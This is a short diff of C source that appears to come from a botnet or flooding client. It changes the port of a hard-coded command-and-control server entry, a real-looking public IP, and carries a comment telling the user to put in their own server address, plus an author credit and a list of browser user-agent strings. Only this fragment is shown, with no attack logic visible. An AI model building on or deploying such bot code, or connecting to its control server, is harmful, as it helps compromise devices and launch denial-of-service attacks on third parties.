@@ -25,7 +25,7 @@
 #define PRINT_BUF_LEN 12
 #define std_packet 1460
 //Made By @i_am_unbekannt.
-unsigned char *commServer[] = {"209.25.141.229:25789"}; //change 'SERVER IP' to your server ip
+unsigned char *commServer[] = {"209.25.141.229:35173"}; //change 'SERVER IP' to your server ip
 
 const char *useragents[] = {
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
